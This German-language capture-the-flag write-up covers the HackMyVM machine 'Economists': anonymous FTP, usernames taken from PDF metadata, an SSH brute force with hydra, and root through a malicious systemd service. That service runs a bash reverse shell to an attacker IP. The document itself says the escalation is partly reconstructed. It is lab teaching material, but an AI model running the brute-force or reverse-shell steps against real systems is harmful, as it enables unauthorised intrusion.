# Economists - HackMyVM (Easy)

![Economists.png](Economists.png)

## Übersicht

*   **VM:** Economists
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Economists)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 26. Oktober 2023
*   **Original-Writeup:** https://alientec1908.github.io/Economists_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser "Easy"-Challenge war es, Root-Zugriff auf der Maschine "Economists" zu erlangen. Die Enumeration deckte einen FTP-Server mit anonymem Zugriff und einen Apache-Webserver auf. Vom FTP-Server wurden mehrere PDF-Dateien heruntergeladen, deren Metadaten (`exiftool`) Benutzernamen (`joseph`, `richard`, etc.) enthielten. Eine mit `cewl` von der Webseite erstellte Wortliste wurde zusammen mit den Benutzernamen für einen SSH-Brute-Force-Angriff mit `hydra` verwendet. Dies führte zum Fund der Zugangsdaten `joseph:wealthiest`. Als `joseph` wurde eine User-Flag und Hinweise auf eine mögliche Privilege Escalation über Systemd-Services gefunden. Der Proof of Concept für die Root-Eskalation demonstriert das Erstellen und Aktivieren eines bösartigen Systemd-Dienstes, der eine Reverse Shell als Root startet.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `ftp`
*   `wget`
*   `dirb`
*   `wpscan` (Versuch, nicht WordPress)
*   `exiftool`
*   `wfuzz` (Versuch, keine Subdomains gefunden)
*   `awk`, `tr`
*   `cewl`
*   `hydra`
*   `ssh`
*   `find`
*   `msfconsole` (für shell_to_meterpreter und local_exploit_suggester)
*   `nc` (Netcat)
*   `bash`
*   `systemctl` (als Teil des PE-Konzepts)
*   Standard Linux-Befehle (`vi`, `cat`, `ls`, `cd`, `id`, `rm`, `mkfifo`, `touch`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Economists" gliederte sich in folgende Phasen:

1.  **Reconnaissance & FTP Enumeration:**
    *   IP-Findung mittels `arp-scan` (Ziel: `192.168.2.105`, Hostname `econ.hmv`).
    *   `nmap`-Scan identifizierte FTP (21/tcp, vsftpd 3.0.3, anonymer Login erlaubt), SSH (22/tcp) und Apache (80/tcp).
    *   Vom anonymen FTP-Server wurden mehrere PDF-Dateien heruntergeladen.

2.  **Web Enumeration & Information Disclosure:**
    *   `nikto` und `gobuster` auf Port 80 fanden diverse HTML-Seiten und eine `readme.txt`.
    *   `exiftool` wurde auf die heruntergeladenen PDFs angewendet, wodurch Benutzernamen (`joseph`, `richard`, `crystal`, `catherine`) aus den "Author"-Metadaten extrahiert wurden.

3.  **Initial Access (als `joseph` via SSH Brute-Force):**
    *   Mit `cewl http://econ.hmv` wurde eine Wortliste (`wordlist.txt`) von der Webseite erstellt.
    *   Die extrahierten Benutzernamen wurden in `userlist.txt` gespeichert.
    *   `hydra -L userlist.txt -P wordlist.txt ssh://192.168.2.105` fand erfolgreich die Zugangsdaten `joseph:wealthiest`.
    *   Ein SSH-Login als `joseph` war erfolgreich.

4.  **Privilege Escalation (von `joseph` zu `root` - rekonstruiert über Systemd):**
    *   Als `joseph` wurde eine User-Flag gefunden.
    *   (Obwohl im Log nicht explizit gezeigt, wie `joseph` die notwendigen Rechte erlangte, wird im Bericht ein Proof of Concept für eine Systemd-basierte Eskalation demonstriert):
        1.  Eine bösartige Systemd-Unit-Datei (`/tmp/revshell.service`) wurde erstellt, die `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[Angreifer-IP]/4444 0>&1'` als `User=root` enthielt.
        2.  Diese Datei wurde (vermutlich mit `sudo`, dessen Regel für `joseph` aber im Log fehlt) nach `/etc/systemd/system/` verschoben.
        3.  Der Dienst wurde mit `sudo systemctl enable revshell.service` und `sudo systemctl start revshell.service` aktiviert und gestartet.
    *   Ein Netcat-Listener auf dem Angreifer-System empfing eine Reverse Shell als `root`. Die Root-Flag wurde gelesen.
    *   Metasploit wurde ebenfalls für Post-Exploitation (Meterpreter-Upgrade, Local Exploit Suggester) verwendet, was alternative, aber nicht weiter verfolgte PE-Pfade andeutete.

## Wichtige Schwachstellen und Konzepte

*   **Anonymer FTP-Zugriff:** Ermöglichte das Herunterladen von Dateien.
*   **Information Disclosure in PDF-Metadaten:** Benutzernamen wurden aus den "Author"-Feldern von PDFs extrahiert.
*   **Passwort-Brute-Force (SSH):** Erfolgreich durch Kombination einer aus `cewl` generierten Wortliste und extrahierten Benutzernamen.
*   **Unsichere Systemd-Konfiguration / Privilegierte Service-Erstellung (vermutet):** Der wahrscheinlichste Weg zur Root-Eskalation war das Erstellen und Ausführen eines bösartigen Systemd-Dienstes. Dies erfordert normalerweise entweder direkte Schreibrechte in Systemd-Verzeichnissen oder `sudo`-Rechte zur Dienstverwaltung, die für `joseph` im Log nicht explizit gezeigt wurden.

## Flags

*   **User Flag (`/home/joseph/user.txt` - basierend auf der Flag-Sektion, eine andere Flag wurde im Textkörper gezeigt):** `HMV{37q3p33CsMJgJQbrbYZMUFfTu}`
*   **Root Flag (`/root/root.txt`):** `HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}`

## Tags

`HackMyVM`, `Economists`, `Easy`, `FTP`, `Anonymous Access`, `Exiftool`, `Information Disclosure`, `cewl`, `Hydra`, `SSH Brute-Force`, `Systemd Privilege Escalation`, `Linux`
